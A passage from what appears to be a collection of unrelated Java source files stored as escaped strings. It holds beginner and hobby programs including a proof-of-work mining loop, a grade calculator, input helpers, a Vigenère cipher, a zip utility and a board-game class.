{\n\t\t\ttransationInformations += transactionList.get(i).getInformation();\n\t\t}\n\t\treturn Util.getHash(nonce + transationInformations + previousBlockHash);\n\t}\n\t\n\tpublic void mine() {\n\t\twhile(true) {\n\t\t\tif(getBlockHash().substring(0,4).equals(\"0000\")) {\n\t\t\t\tSystem.out.println(blockID + \"\ubc88\uc9f8 \ube14\ub85d\uc758 \ucc44\uad74\uc5d0 \uc131\uacf5\ud588\uc2b5\ub2c8\ub2e4.\");\n\t\t\t\tbreak;\n\t\t\t}\n\t\t\tnonce++;\n\t\t}\n\t}\n\t\n\tpublic int getBlockID() {\n\t\treturn blockID;\n\t}\n\tpublic void setBlockID(int blockID) {\n\t\tthis.blockID = blockID;\n\t}\n\tpublic int getNonce() {\n\t\treturn nonce;\n\t}\n\tpublic void setNonce(int nonce) {\n\t\tthis.nonce = nonce;\n\t}\n\n\tpublic void setPreviousBlockHash(String previousBlockHash) {\n\t\tthis.previousBlockHash = previousBlockHash;\n\t}\n\t\n\tpublic String getPreviousBlockHash() {\n\t\treturn previousBlockHash;\n\t}\n\t\n}\n",
    "//Input: Take marks obtained (out of 100) in each subject.\n//        Calculate Total Marks: Sum up the marks obtained in all subjects.\n//        Calculate Average Percentage: Divide the total marks by the total number of subjects to get the\n//        average percentage.\n//        Grade Calculation: Assign grades based on the average percentage achieved.\n//        Display Results: Show the total marks, average percentage, and the corresponding grade to the user\nimport java.sql.SQLOutput;\nimport java.util.*;\n\npublic class StudentGradeCalculator {\n    // here i am taking the marks in 6 subjects of the curriculum\n\n    public static void main(String[] args)\n    {\n        // first of all i will take the input from the user in terms of marks obtained by him/her\n        // to do i will create an instance of the scanner class\n        Scanner sc = new Scanner(System.in);\n\n        // initialize the subjects\n        int maths,hindi,science,sanskrit,english,general_knowledge;\n        System.out.println(\"STUDENT GRADE CALCULATOR\");\n        System.out.println(\"Enter the marks obtained by the student\");\n        // now i will input them all the subject marks ;\n        System.out.print(\"Maths:\");\n        maths =sc.nextInt();\n        System.out.print(\"Hindi:\");\n       hindi =sc.nextInt();\n        System.out.print(\"Sanskrit:\");\n       sanskrit =sc.nextInt();\n        System.out.print(\"English:\");\n       english =sc.nextInt();\n        System.out.print(\"General Knowledge:\");\n        general_knowledge =sc.nextInt();\n        System.out.print(\"Science:\");\n       science =sc.nextInt();\n       // we can also do this with the help of the loops but the number of subjects i have taken are less\n        // this approach can also be preferable\n       int sum = (maths +english+sanskrit+science+general_knowledge+hindi);\n        System.out.print(\"Total Marks gained  by the student :\");\n        System.out.println(sum);\n\n        double average_percentage= (sum/6) ;  // here 6 is the total number of students\n\n        System.out.print(\"Average Percentage gained by the student: \");\n        System.out.println(average_percentage);\n\n\n\n\n\n\n\n        if(average_percentage >=0 && average_percentage <=34 )\n        {\n            System.out.println(\"GRADE: E\");\n            System.out.println(\"Failed\");\n        }\n        else if(average_percentage >=35 && average_percentage <=49 )\n        {\n            System.out.println(\"GRADE: D\");\n            System.out.println(\"Work Harder\");\n        }\n        else if(average_percentage >=50 && average_percentage <=69 )\n        {\n            System.out.println(\"GRADE: C\");\n            System.out.println(\"Could be better and needs more practice \");\n        }\n        else if(average_percentage >=70 && average_percentage <=84 )\n        {\n            System.out.println(\"GRADE: B\");\n            System.out.println(\"Very Good Performance\");\n\n        }\n        else {\n            System.out.println(\"Excellent!Good Job\");\n        }\n\n        System.out.println();\n\n        System.out.println(\"____________________________________________________________________________\");\n        System.out.println(\"____________________________________________________________________________\");\n\n        System.out.println(\"  here i am going to give the grade in the following way \\n\" +\n                \"         85-100 ---> A   // Excellent Result\\n\" +\n                \"         70-84 --->  B   // Very Good Performance\\n\" +\n                \"         50 - 69 ---> C  // Could be better and need more practice \\n\" +\n                \"         35 - 49 ---> D // Work Harder \\n\" +\n                \"         0- 34 ---->E //Failed\");\n        System.out.println(\"____________________________________________________________________________\");\n        System.out.println(\"____________________________________________________________________________\");\n\n\n\n\n\n    }\n\n\n}\n",
    "\nimport java.util.Scanner;\n\n/*\n * To change this license header, choose License Headers in Project Properties.\n * To change this template file, choose Tools | Templates\n * and open the template in the editor.\n */\n\n/**\n *\n * @author Tom Wulf Tom.Wulf@uc.edu\n */\npublic class SafeInput\n{\n    /**\n     * Get a String which contains at least one character\n     * @param pipe a Scanner opened to read from System.in\n     * @param prompt prompt for the user\n     * @return a String response that is not zero length\n     */\n    public static String getNonZeroLenString(Scanner pipe, String prompt)\n    {\n        String retString = \"\";\n        do\n        {\n            System.out.print(\"\\n\" + prompt + \": \");\n            retString = pipe.nextLine();\n        }while(retString.length() == 0); // until we have some characters\n\n        return retString;\n\n    }\n    /**\n     * Get an int value within a specified numeric range\n     * @param pipe - Scanner instance to read the data System.in in most cases\n     * @param prompt - input prompt msg should not include range info\n     * @param low - low end of inclusive range\n     * @param high - high end of inclusive range\n     * @return - int value within the inclusive range\n     */\n    public static int getRangedInt(Scanner pipe, String prompt, int low, int high)\n    {\n        int retVal = 0;\n        String trash = \"\";\n        boolean done = false;\n\n        do\n        {\n            System.out.print(\"\\n\" + prompt + \"[\" + low + \"-\" + high + \"]: \");\n            if(pipe.hasNextInt())\n            {\n                retVal = pipe.nextInt();\n                pipe.nextLine();\n                if(retVal >= low && retVal <= high)\n                {\n                    done = true;\n                }\n                else\n                {\n                    System.out.println(\"\\nNumber is out of range [\" + low + \"-\" + high + \"]: \" + retVal);\n                }\n            }\n            else\n            {\n                trash = pipe.nextLine();\n                System.out.println(\"You must enter an int: \" + trash);\n            }\n        }while(!done);\n\n        return retVal;\n    }\n\n    /**\n     * Get an int value with no constraints\n     * @param pipe - Scanner instance to read the data System.in in most cases\n     * @param prompt - input prompt msg should not include range info\n     * @return - unconstrained int value \n     */\n    public static int getInt(Scanner pipe, String prompt)\n    {\n        int retVal = 0;\n        String trash = \"\";\n        boolean done = false;\n\n        do\n        {\n            System.out.print(\"\\n\" + prompt + \": \");\n            if(pipe.hasNextInt())\n            {\n                retVal = pipe.nextInt();\n                pipe.nextLine();\n                done = true;\n            }\n            else\n            {\n                trash = pipe.nextLine();\n                System.out.println(\"You must enter an int: \" + trash);\n            }\n        }while(!done);\n\n        return retVal;\n    }\n\n\n    /**\n     * get a double value within an inclusive range\n     * @param pipe - Scanner instance to read the data System.in in most cases\n     * @param prompt - input prompt msg should not contain range info\n     * @param low - low value inclusive\n     * @param high - high value inclusive\n     * @return  - double value within the specified inclusive range\n     */\n    public static double getRangedDouble(Scanner pipe, String prompt, int low, int high)\n    {\n        double retVal = 0;\n        String trash = \"\";\n        boolean done = false;\n\n        do\n        {\n            System.out.print(\"\\n\" + prompt + \"[\" + low + \"-\" + high + \"]: \");\n            if(pipe.hasNextDouble())\n            {\n                retVal = pipe.nextDouble();\n                pipe.nextLine();\n                if(retVal >= low && retVal <= high)\n                {\n                    done = true;\n                }\n                else\n                {\n                    System.out.println(\"\\nNumber is out of range [\" + low + \"-\" + high + \"]: \" + retVal);\n                }\n            }\n            else\n            {\n                trash = pipe.nextLine();\n                System.out.println(\"You must enter a double: \" + trash);\n            }\n        }while(!done);\n\n        return retVal;\n    }\n\n    /**\n     * Get an unconstrained double value\n     * @param pipe - Scanner instance to read the data System.in in most cases\n     * @param prompt - input prompt msg should not contain range info\n     * @return  - an unconstrained double value \n     */\n    public static double getDouble(Scanner pipe, String prompt)\n    {\n        double retVal = 0;\n        String trash = \"\";\n        boolean done = false;\n\n        do\n        {\n            System.out.print(\"\\n\" + prompt + \": \");\n            if(pipe.hasNextDouble())\n            {\n                retVal = pipe.nextDouble();\n                pipe.nextLine();\n                done = true;\n            }\n            else\n            {\n                trash = pipe.nextLine();\n                Sys",
    "\npackage Perceptron;\n\n\npublic class Main extends javax.swing.JFrame {\n\n    Neurona n;\n    String [] consonantes = {\"b\",\"c\",\"d\",\"f\",\"g\",\"h\",\"j\",\"k\",\"l\",\"m\",\"n\",\"o\",\"p\",\"q\",\"r\",\"s\",\"t\",\"u\",\"v\",\"w\",\n                   \"x\",\"y\",\"z\"}; //vector entrada\n    String [] vocales = {\"a\",\"e\",\"i\",\"o\",\"u\"}; // pesos\n\n    public Main() {\n        initComponents();\n        String palabra = \"coco\";\n        n = new Neurona(consonantes, vocales);\n        n.entrenamiento(palabra);\n        \n        \n        for(String silaba:n.silabas){\n            textArea.append(silaba + \"\\n\");\n        }\n    }\n\n    @SuppressWarnings(\"unchecked\")\n    // <editor-fold defaultstate=\"collapsed\" desc=\"Generated Code\">//GEN-BEGIN:initComponents\n    private void initComponents() {\n\n        jScrollPane1 = new javax.swing.JScrollPane();\n        textArea = new javax.swing.JTextArea();\n        jLabel1 = new javax.swing.JLabel();\n\n        setDefaultCloseOperation(javax.swing.WindowConstants.EXIT_ON_CLOSE);\n\n        textArea.setColumns(20);\n        textArea.setRows(5);\n        jScrollPane1.setViewportView(textArea);\n\n        jLabel1.setFont(new java.awt.Font(\"Liberation Sans\", 0, 24)); // NOI18N\n        jLabel1.setText(\"PERCEPTR\u00d3N\");\n\n        javax.swing.GroupLayout layout = new javax.swing.GroupLayout(getContentPane());\n        getContentPane().setLayout(layout);\n        layout.setHorizontalGroup(\n            layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)\n            .addGroup(layout.createSequentialGroup()\n                .addGap(72, 72, 72)\n                .addComponent(jScrollPane1, javax.swing.GroupLayout.DEFAULT_SIZE, 360, Short.MAX_VALUE)\n                .addGap(68, 68, 68))\n            .addGroup(layout.createSequentialGroup()\n                .addGap(170, 170, 170)\n                .addComponent(jLabel1)\n                .addContainerGap(javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE))\n        );\n        layout.setVerticalGroup(\n            layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)\n            .addGroup(javax.swing.GroupLayout.Alignment.TRAILING, layout.createSequentialGroup()\n                .addGap(22, 22, 22)\n                .addComponent(jLabel1)\n                .addGap(18, 18, 18)\n                .addComponent(jScrollPane1, javax.swing.GroupLayout.DEFAULT_SIZE, 280, Short.MAX_VALUE)\n                .addGap(52, 52, 52))\n        );\n\n        pack();\n    }// </editor-fold>//GEN-END:initComponents\n\n\n    public static void main(String args[]) {\n        /* Set the Nimbus look and feel */\n        //<editor-fold defaultstate=\"collapsed\" desc=\" Look and feel setting code (optional) \">\n        /* If Nimbus (introduced in Java SE 6) is not available, stay with the default look and feel.\n         * For details see http://download.oracle.com/javase/tutorial/uiswing/lookandfeel/plaf.html \n         */\n        try {\n            for (javax.swing.UIManager.LookAndFeelInfo info : javax.swing.UIManager.getInstalledLookAndFeels()) {\n                if (\"Nimbus\".equals(info.getName())) {\n                    javax.swing.UIManager.setLookAndFeel(info.getClassName());\n                    break;\n                }\n            }\n        } catch (ClassNotFoundException ex) {\n            java.util.logging.Logger.getLogger(Main.class.getName()).log(java.util.logging.Level.SEVERE, null, ex);\n        } catch (InstantiationException ex) {\n            java.util.logging.Logger.getLogger(Main.class.getName()).log(java.util.logging.Level.SEVERE, null, ex);\n        } catch (IllegalAccessException ex) {\n            java.util.logging.Logger.getLogger(Main.class.getName()).log(java.util.logging.Level.SEVERE, null, ex);\n        } catch (javax.swing.UnsupportedLookAndFeelException ex) {\n            java.util.logging.Logger.getLogger(Main.class.getName()).log(java.util.logging.Level.SEVERE, null, ex);\n        }\n        //</editor-fold>\n\n        /* Create and display the form */\n        java.awt.EventQueue.invokeLater(new Runnable() {\n            public void run() {\n                new Main().setVisible(true);\n            }\n        });\n    }\n\n    // Variables declaration - do not modify//GEN-BEGIN:variables\n    private javax.swing.JLabel jLabel1;\n    private javax.swing.JScrollPane jScrollPane1;\n    private javax.swing.JTextArea textArea;\n    // End of variables declaration//GEN-END:variables\n}\n",
    "package org.MMG.Automation;\n\nimport org.openqa.selenium.WebDriver;\nimport org.openqa.selenium.chrome.ChromeDriver;\nimport org.openqa.selenium.support.ui.WebDriverWait;\nimport org.testng.annotations.AfterMethod;\nimport org.testng.annotations.BeforeMethod;\nimport org.testng.annotations.Test;\n\nimport java.time.Duration;\n\npublic class LoginTests {\n    public static final String BASE_URL = \"http://training.skillo-bg.com:4200/\";\n    public static final String HOME_URL = \"posts/all\";\n    public static final String LOGIN_URL = \"users/login\";\n\n    WebDriver driver = new ChromeDriver();\n    WebDriverWait wait = new WebDriverWait(driver, Duration.ofSeconds(5));\n\n    @BeforeMethod\n    public void initBrowser(){\n        driver.manage().window().maximize();\n        driver.manage().timeouts().implicitlyWait(Duration.ofSeconds(10));\n    }\n\n    @Test\n    public  void navigationToLoginPage(){\n        driver.get(BASE_URL);\n        System.out.println(\"The site is open\");\n        \n\n\n    }\n\n    @AfterMethod\n    public void tearDown() {\n        if (driver!=null) {\n            driver.quit();\n        }\n    }\n\n\n\n}\n",
    "\nimport java.util.ArrayList;\nimport java.util.Arrays;\nimport java.util.HashMap;\nimport java.util.List;\nimport java.util.Map;\n\npublic class App {\n\tpublic static void main(String[] args) {\n\t\ttestarVerificarPar(7);\n\t\ttestarVerificarPar(10);\n\t\ttestarVerificarPar(0);\n\t\ttestarVerificarPar(-5);\n\t\ttestarVerificarPar(-4);\n\t\timprimeSeqFibonacci(5);\n\t\tmultiplicaAi(2);\n\t\tpiramideDeNumeros(5);\n\t\tduplicadosNao();\n\t\timprimeFeriados(\"21-04-2024\");\n\t}\n\n\tpublic static boolean verificarPar(int num) {\n\t\treturn num % 2 == 0;\n\t}\n\n\tpublic static void testarVerificarPar(int numero) {\n\t\tif (verificarPar(numero) && numero < 0) {\n\t\t\tSystem.out.println(numero + \" \u00e9 par e negativo\");\n\t\t} else if (verificarPar(numero) && numero >= 0) {\n\t\t\tSystem.out.println(numero + \" \u00e9 par e positivo\");\n\t\t} else if (!verificarPar(numero) && numero < 0) {\n\t\t\tSystem.out.println(numero + \" \u00e9 \u00edmpar e negativo\");\n\t\t} else {\n\t\t\tSystem.out.println(numero + \" \u00e9 \u00edmpar e positivo\");\n\t\t}\n\t}\n\n\tpublic static void imprimeSeqFibonacci(int numero) {\n\t\tList<Integer> seqFib = new ArrayList<>();\n\t\tseqFib.add(0);\n\t\tseqFib.add(1);\n\n\t\tfor (int i = 2; i < numero; i++) {\n\t\t\t// Para acessar o elemento de uma lista \u00e9 necess\u00e1rio utilizar o get\n\t\t\tint elemento = seqFib.get(i - 2) + seqFib.get(i - 1);\n\t\t\tseqFib.add(elemento);\n\t\t}\n\n\t\tSystem.out.println(seqFib);\n\t}\n\n\tpublic static void multiplicaAi(int numero) {\n\t\tSystem.out.println(\"Tabela de multiplica\u00e7\u00e3o por \" + numero);\n\n\t\tfor (int i = 1; i <= 10; i++) {\n\t\t\tint resultado = numero * i;\n\t\t\tSystem.out.println(numero + \" x \" + i + \" = \" + resultado);\n\t\t}\n\t}\n\n\tpublic static void piramideDeNumeros(int numero) {\n\t\tfor (int i = 1; i <= numero; i++) {\n\t\t\tString linha = \"\";\n\n\t\t\t// N\u00e3o \u00e9 poss\u00edvel criar uma repeti\u00e7\u00e3o multiplicando a string por um valor\n\t\t\tfor (int j = 0; j < i; j++) {\n\t\t\t\tlinha += String.valueOf(i);\n\t\t\t}\n\n\t\t\tSystem.out.println(linha);\n\t\t}\n\t}\n\n\tpublic static void duplicadosNao() {\n\t\tList<String> array1 = Arrays.asList(\"Morango\", \"Banana\", \"Ma\u00e7\u00e3\", \"Uva\", \"Caqui\");\n\t\tList<String> array2 = Arrays.asList(\"Manga\", \"Caqui\", \"Morango\", \"Amora\");\n\t\tList<String> resultado = new ArrayList<>();\n\n\t\tfor (int i = 0; i < array1.size(); i++) {\n\t\t\tString elemento = array1.get(i);\n\t\t\tfor (int j = 0; j < array2.size(); j++) {\n\t\t\t\tif (elemento.equals(array2.get(j))) { // Use equals para comparar strings\n\t\t\t\t\tresultado.add(elemento);\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\n\t\t// O m\u00e9todo n\u00e3o aceita m\u00faltiplos argumentos separados por v\u00edrgula\n\t\tSystem.out.println(\"Array 1: \" + array1);\n\t\tSystem.out.println(\"Array 2: \" + array2);\n\t\tSystem.out.println(\"Resultado: \" + resultado);\n\t}\n\n\tpublic static void imprimeFeriados(String data) {\n\t\t//Cria um HashMap vazio\n\t\tMap<String, String> eventos = new HashMap<>();\n\n\t\t//Associa pares chave-valor\n\t\t//O m\u00e9todo put serve para adicionar elementos \n\t\teventos.put(\"01-01-2024\", \"Confraterniza\u00e7\u00e3o Mundial\");\n\t\teventos.put(\"12-02-2024\", \"Carnaval\");\n\t\teventos.put(\"13-02-2024\", \"Carnaval\");\n\t\teventos.put(\"29-03-2024\", \"Sexta-feira Santa\");\n\t\teventos.put(\"21-04-2024\", \"Tiradentes\");\n\t\teventos.put(\"01-05-2024\", \"Dia do Trabalho\");\n\t\teventos.put(\"30-05-2024\", \"Corpus Christi\");\n\t\teventos.put(\"07-09-2024\", \"Independ\u00eancia do Brasil\");\n\t\teventos.put(\"12-10-2024\", \"Nossa Senhora Aparecida\");\n\t\teventos.put(\"02-11-2024\", \"Finados\");\n\t\teventos.put(\"15-11-2024\", \"Proclama\u00e7\u00e3o da Rep\u00fablica\");\n\t\teventos.put(\"20-11-2024\", \"Dia Nacional de Zumbi e da Consci\u00eancia Negra\");\n\t\teventos.put(\"25-12-2024\", \"Natal\");\n\n\t\t// Imprime todos os eventos\n\t\tfor (Map.Entry<String, String> evento : eventos.entrySet()) {\n\t\t\t//O m\u00e9todo get serve para acessar a chave ou o valor\n\t\t\tSystem.out.println(evento.getKey() + \" => \" + evento.getValue());\n\t\t}\n\n\t\tString evento = eventos.get(data);\n\t\tif (evento != null) {\n\t\t\tSystem.out.println(\"Dia \" + data + \" \u00e9 \" + evento);\n\t\t    } else {\n\t\t\tSystem.out.println(\"Dia \" + data + \" n\u00e3o \u00e9 feriado\");\n\t\t    }\n\t}\n}\n",
    "package com.example.rabbitlab;\n\nimport org.springframework.amqp.rabbit.core.RabbitTemplate;\nimport org.springframework.boot.CommandLineRunner;\nimport org.springframework.stereotype.Component;\n\nimport java.time.LocalTime;\n\n@Component\npublic class Runner implements CommandLineRunner {\n\n    private final RabbitTemplate rabbitTemplate;\n    private static final String directExchangeName = \"TolochikIgor-direct-exchange-2103829\";\n    private static final String fanoutExchangeName = \"TolochikIgor-fanout-exchange-2103829\";\n    private static final String routingKey = \"2103829\";\n\n    public Runner(RabbitTemplate rabbitTemplate) {\n        this.rabbitTemplate = rabbitTemplate;\n    }\n\n    @Override\n    public void run(String... args) throws Exception {\n        int i = 0;\n        while (true) {\n            System.out.printf(\"Iteration %d: Sending message to fanout exchange...\\n\", i);\n            rabbitTemplate.convertAndSend(fanoutExchangeName, \"\", \"Fanout Exchange -> Tolochik I V 2103829 | Time: \" + LocalTime.now());\n            System.out.printf(\"Iteration %d: Sending message to direct exchange...\\n\", i);\n            rabbitTemplate.convertAndSend(directExchangeName, routingKey, \"Direct Exchange -> Tolochik I V 2103829 | Time: \" + LocalTime.now());\n            i++;\n            Thread.sleep(10000);\n        }\n    }\n}\n\n",
    " package com.example.photomodifier;\n\nimport androidx.annotation.Nullable;\nimport androidx.appcompat.app.AppCompatActivity;\n\n//import android.app.Activity;\nimport android.content.Intent;\nimport android.net.Uri;\nimport android.os.Bundle;\n//import android.preference.PreferenceManager;\nimport android.view.View;\nimport android.widget.Button;\n\nimport com.example.photomodifier.databinding.ActivityMainBinding;\nimport com.github.dhaval2404.imagepicker.ImagePicker;\n\n public class selecter_img_page extends AppCompatActivity {\n     ActivityMainBinding binding;\n     public static Uri imgUri;\n     @Override\n    protected void onCreate(Bundle savedInstanceState) {\n        super.onCreate(savedInstanceState);\n        setContentView(R.layout.activity_selecter_img_page);\n        binding=ActivityMainBinding.inflate(getLayoutInflater());\n\n        //setContentView(binding.getRoot());\n\n         Button btn = findViewById(R.id.Start);\n\n         btn.setOnClickListener(new View.OnClickListener() {\n             @Override\n             public void onClick(View view) {\n\n\n                 ImagePicker.Companion.with(selecter_img_page.this)\n                         .crop()\t    \t\t\t//Crop image(Optional), Check Customization for more option\n                      //   .compress(1024)\t\t\t//Final image size will be less than 1 MB(Optional)\n                       //  .maxResultSize(1080, 1080)\t//Final image resolution will be less than 1080 x 1080(Optional)\n                         .start();\n\n\n             }\n         });\n    }\n\n     @Override\n     protected void onActivityResult(int requestCode, int resultCode, @Nullable Intent data) {\n         super.onActivityResult(requestCode, resultCode, data);\n\n\n         if (data.getResultCode()\n                 ==Activity.RESULT_OK) {\n             Intent intent = data.getData();\n             // do your operation from here....\n             if (intent != null && intent.getData() != null) {\n                 Uri selectedimageUri = data.getData();\n                 Intent intent1 = new Intent(this, FinalActivity.class);\n                 intent1.putExtra(\"IMG_URI\", selectedimageUri);\n                 startActivity(intent1);\n             }\n         }\n//         try {\n//             imgUri = data.getData();\n//             if (!imgUri.equals(\"\"));\n//             startActivity(new Intent(selecter_img_page.this, FinalActivity.class));\n//         }\n//         catch (Exception e){\n//\n//         }\n\n     }\n }",
    "package br.ifba;\n\nimport java.util.Arrays;\nimport java.util.regex.Matcher;\nimport java.util.regex.Pattern;\n\nimport br.ifba.exception.InvalidParameterException;\n\n/**\n * Hello world!\n *\n */\npublic class App \n{\n\t\n\tprivate static final String REGEX = \"[^A-Z]{1,}\";\n\n\tprivate static final String DECRIPT = \"DECRIPT\";\n\n\tprivate static final String ENCRIPT = \"ENCRIPT\";\n\n\tprivate static final String[] matrix = {\"A\", \"B\", \"C\", \"D\", \"E\", \"F\", \"G\",\"H\", \"I\", \"J\", \"K\", \"L\",\"M\", \"N\", \"O\", \"P\", \"Q\", \"R\", \"S\", \"T\", \"U\", \"V\", \"W\", \"X\", \"Y\", \"Z\",\"A\", \"B\", \"C\", \"D\", \"E\", \"F\", \"G\",\"H\", \"I\", \"J\", \"K\", \"L\",\"M\", \"N\", \"O\", \"P\", \"Q\", \"R\", \"S\", \"T\", \"U\", \"V\", \"W\", \"X\", \"Y\", \"Z\"};\n\t\n\tprivate static String[][] cifra = new String[26][26];\n\t\n\tprivate static void loadCifra(){\n\t\t\n\t\tfor (int i=0; i < 25;i++) {\n\t\t\tfor (int j=i; j < i+25;j++) {\n\t\t\t\tcifra[i][j-i]=matrix[j];\n\t\t\t}\n\t\t}\n\t\t\t\t\n\t}\n\t\n\tprivate static boolean validateField(String value) {\n\t\t\n\t\tboolean validate = true;\n\t\t\n\t\tPattern pattern = Pattern.compile(REGEX, Pattern.CASE_INSENSITIVE);\n\t    Matcher matcher = pattern.matcher(value);\n\t    boolean matchFound = matcher.find();\n\t    \n\t    if(matchFound) {\n\t    \tvalidate = false;\n\t    } \n\t    \n\t    return validate;\n\t}\n\t\n\t\n    public static void main( String[] args )\n    {\n    \ttry {\n    \t\t\n\t\t\tif (args.length!=3 || (args[0].length()==0 && ENCRIPT.equals(args[0]) || DECRIPT.equals(args[0])) || \n\t\t\t\t\targs[1].length()==0 || !validateField(args[1]) || args[2].length()==0 || !validateField(args[2])) {\n\t\t\t\tthrow new InvalidParameterException(\"Parametros inavalidos....\");\n\t\t\t}\n    \t    \t\n\t\t\tString operacao = args[0].toUpperCase();\n\t\t\tString text = args[1].toUpperCase();\n\t\t\tString chave = args[2].toUpperCase();\n\t\t\t\n\t\t\tString textoCifrado=\"\";\n\t\t\t\n\t\t\tloadCifra();\n\t\t\t\n\t\t\t/**\n\t\t\t * Verifica se a chave \u00e9 menor que o texto, se for repete a chave ate que fique maior ou igual \n\t\t\t */\n\t\t\tif (chave.length() < text.length()) {\n\t\t\t\tfor (int i=0;i<text.length()-chave.length();i++) {\n\t\t\t\t\tchave+=chave;\n\t\t\t\t\tif (chave.length() >= text.length()) {\n\t\t\t\t\t\tbreak;\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t}\n\t\t\t\n\t\t\t/**\n\t\t\t * Aqui acontece o encript ou decript\n\t\t\t */\n\t\t\tfor (int i=0; i < text.length();i++) {\n\t\t\t\tString letraTexto = text.split(\"|\")[i];\n\t\t\t\tString letraChave = chave.split(\"|\")[i];\n\t\t\t\t\n\t\t\t\tint posLetraTexto = Arrays.asList(matrix).indexOf(letraTexto);\n\t\t\t\tint posLetraChave = Arrays.asList(matrix).indexOf(letraChave);\n\t\t\t\t\n\t\t\t\tif (ENCRIPT.equals(operacao)) {\n\t\t\t\t\ttextoCifrado+=cifra[posLetraTexto][posLetraChave];\n\t\t\t\t}else {\n\t\t\t\t\tint result = posLetraTexto - posLetraChave < 0?(posLetraTexto - posLetraChave)+26:posLetraTexto - posLetraChave;\n\t\t\t\t\t\n\t\t\t\t\ttextoCifrado+=matrix[result];\n\t\t\t\t}\n\t\t\t\t\n\t\t\t\t\n\t\t\t}\n\t\t\t\n\t\t\tSystem.out.println(textoCifrado);\n\t\t\t\n\t\t}catch (InvalidParameterException e) {\n\t\t\tSystem.out.println(\"entre com a operacao, o texto e a chave de criptografia ex.: encript|decript texto chave. Obs.: o texto e a chave so podem conter letras\");\n\t\t}\n\t\t\n\t\tcatch(Exception e ) {\n\t\t\te.printStackTrace();\n\t\t}\n\n    }\n}\n",
    "package com.yf.exam.core.utils.file;\n\nimport java.io.BufferedInputStream;\nimport java.io.File;\nimport java.io.FileInputStream;\nimport java.io.FileOutputStream;\nimport java.io.IOException;\nimport java.util.zip.CRC32;\nimport java.util.zip.CheckedOutputStream;\nimport java.util.zip.ZipEntry;\nimport java.util.zip.ZipOutputStream;\n\n/**\n * \u538b\u7f29\u6587\u4ef6\u5de5\u5177\u7c7b\n * @author Dav\n */\npublic class ZipUtils {\n\n    /**\n     * \u7f13\u51b2\u6d41\u957f\u5ea6\n     */\n    private static final int BUFFER_SIZE = 1024;\n\n\n    /**\n     * \u538b\u7f29\u6587\u4ef6\n     * @param srcFilePath \u8f93\u5165\u6587\u4ef6\u6216\u6587\u4ef6\u5939\n     * @param destFilePath \u76ee\u6807\u6587\u4ef6\n     */\n    public static void compress(String srcFilePath, String destFilePath) {\n        File src = new File(srcFilePath);\n        if (!src.exists()) {\n            throw new RuntimeException(srcFilePath + \"\u4e0d\u5b58\u5728\");\n        }\n        File zipFile = new File(destFilePath);\n        try {\n            FileOutputStream fos = new FileOutputStream(zipFile);\n            CheckedOutputStream cos = new CheckedOutputStream(fos, new CRC32());\n            ZipOutputStream zos = new ZipOutputStream(cos);\n            String baseDir = \"\";\n            compressByType(src, zos, baseDir);\n            zos.close();\n            fos.close();\n            cos.close();\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n\n    /**\n     * \u6839\u636e\u7c7b\u578b\u538b\u7f29\u6587\u4ef6\n     * @param src\n     * @param zos\n     * @param baseDir\n     */\n    private static void compressByType(File src, ZipOutputStream zos, String baseDir) {\n        if (!src.exists()) {\n            return;\n        }\n        System.out.println(\"\u538b\u7f29\" + baseDir + src.getName());\n        if (src.isFile()) {\n            compressFile(src, zos, baseDir);\n        } else if (src.isDirectory()) {\n            compressDir(src, zos, baseDir);\n        }\n    }\n\n\n    /**\n     * \u538b\u7f29\u6587\u4ef6\n     * @param file\n     * @param zos\n     * @param baseDir\n     */\n    private static void compressFile(File file, ZipOutputStream zos, String baseDir) {\n        if (!file.exists()) {\n            return;\n        }\n        try {\n            BufferedInputStream bis = new BufferedInputStream(new FileInputStream(file));\n            ZipEntry entry = new ZipEntry(baseDir + file.getName());\n            zos.putNextEntry(entry);\n            int count;\n            byte[] buf = new byte[BUFFER_SIZE];\n            while ((count = bis.read(buf)) != -1) {\n                zos.write(buf, 0, count);\n            }\n            bis.close();\n        } catch (Exception e) {\n\n        }\n    }\n\n    /**\n     * \u538b\u7f29\u6587\u4ef6\u5939\n     * @param dir\n     * @param zos\n     * @param baseDir\n     */\n    private static void compressDir(File dir, ZipOutputStream zos, String baseDir) {\n        if (!dir.exists()) {\n            return;\n        }\n        File[] files = dir.listFiles();\n        if (files.length == 0) {\n            try {\n                zos.putNextEntry(new ZipEntry(baseDir + dir.getName()\n                        + File.separator));\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n        for (File file : files) {\n            compressByType(file, zos, baseDir + dir.getName() + File.separator);\n        }\n    }\n\n\n    public static void main(String[] args) {\n        compress(\"/Users/bool/Desktop/generated/95f141b7-4e0f-4241-9429-37f8dd93f1cb\",\n                \"/Users/bool/Desktop/generated/95f141b7-4e0f-4241-9429-37f8dd93f1cb.zip\");\n    }\n\n}\n",
    "import java.util.ArrayList;\r\nimport java.util.List;\r\nimport java.util.Random;\r\nimport java.util.Scanner;\r\n\r\nclass Player {\r\n    private String name;\r\n    private int cashBalance;\r\n    private int currentPosition;\r\n    private boolean paydaySpaceReached;\r\n    private List<Card> mailCards;\r\n    private List<Card> dealCards;\r\n\r\n    public Player(String name, int startingCash) {\r\n        this.name = name;\r\n        this.cashBalance = startingCash;\r\n        this.currentPosition = 0;\r\n        this.paydaySpaceReached = false;\r\n        this.mailCards = new ArrayList<>();\r\n        this.dealCards = new ArrayList<>();\r\n    }\r\n\r\n    public String getName() {\r\n        return name;\r\n    }\r\n\r\n    public int getCashBalance() {\r\n        return cashBalance;\r\n    }\r\n\r\n    public int getCurrentPosition() {\r\n        return currentPosition;\r\n    }\r\n\r\n    public boolean hasReachedPaydaySpace() {\r\n        return paydaySpaceReached;\r\n    }\r\n\r\n    public void move(int steps) {\r\n        currentPosition += steps;\r\n        if (currentPosition >= Board.NUMBER_OF_SPACES) {\r\n            paydaySpaceReached = true;\r\n        }\r\n    }\r\n\r\n    public void addCash(int amount) {\r\n        cashBalance += amount;\r\n    }\r\n\r\n    public void deductCash(int amount) {\r\n        cashBalance -= amount;\r\n    }\r\n\r\n    public void addMailCard(MailCard card) {\r\n        mailCards.add(card);\r\n    }\r\n\r\n    public void addDealCard(DealCard card) {\r\n        dealCards.add(card);\r\n    }\r\n\r\n    public List<Card> getMailCards() {\r\n        return 